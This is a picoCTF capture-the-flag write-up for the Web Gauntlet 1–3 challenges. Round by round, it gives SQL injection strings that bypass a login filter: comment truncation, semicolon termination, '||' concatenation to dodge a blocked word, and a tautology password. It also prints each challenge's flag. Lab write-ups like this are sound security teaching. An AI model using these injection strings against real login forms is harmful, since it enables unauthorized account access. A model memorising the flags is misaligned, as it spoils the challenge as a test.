# Web Gauntlet 1

Open the links [login](http://jupiter.challenges.picoctf.org:54319/), [filter](http://jupiter.challenges.picoctf.org:54319/filter.php).

## Round 1

Entering any username and password shows the SQL query:
```sql
SELECT * FROM users WHERE username='admin' AND password='admin'
```
We can comment out the rest of the SQL using `--`.
```
Username: admin'--
Password: anything
```
  
## Round 2

The `--` is now filtered, but `;` (semicolon) is allowed. Terminate the current query with a semicolon.
```
Username: admin';
Password: anything
```
  
## Round 3

Same as Round 2, `;` is still not filtered.
```
Username: admin';
Password: anything
```
  
## Round 4

The string `admin` is blocked. Bypass blacklist by splitting the string and concatenating it using SQL string concatenation with `||`.
```
Username: ad'||'min';
Password: anything
```
  
## Round 5

Same constraints as Round 4. Continue using string concatenation.
```
Username: ad'||'min';
Password: anything
```

- **Flag:** `picoCTF{y0u_m4d3_1t_a5f58d5564fce237fbcc978af033c11b}`
  
---

# Web Gauntlet 2

Open the links [login](http://mercury.picoctf.net:65261/), [filter]( http://mercury.picoctf.net:65261/filter.php).

Can't use `admin` but concatenation still works, so use:
```
Username: ad'||'min
```
Now, commenting or ending the query doesn't work. So we must provide the correct password.
If the SQL evaluates something like `'a' != 'b'` it's true.
So we try:
```
Username: ad'||'min
Password: a' is not 'b
```

- **Flag:** `picoCTF{0n3_m0r3_t1m3_e2db86ae880862ad471aa4c93343b2bf}`
  
---

# Web Gauntlet 3

Open the links [login](http://mercury.picoctf.net:63504/), [filter](http://mercury.picoctf.net:63504/filter.php).

Since our solution from the previous challenge didn't exceed 25 characters we can simply use the same credentials.
```
Username: ad'||'min
Password: a' is not 'b
```

- **Flag:** `picoCTF{k3ep_1t_sh0rt_eb90a623e2c581bcd3127d9d60a4dead}`

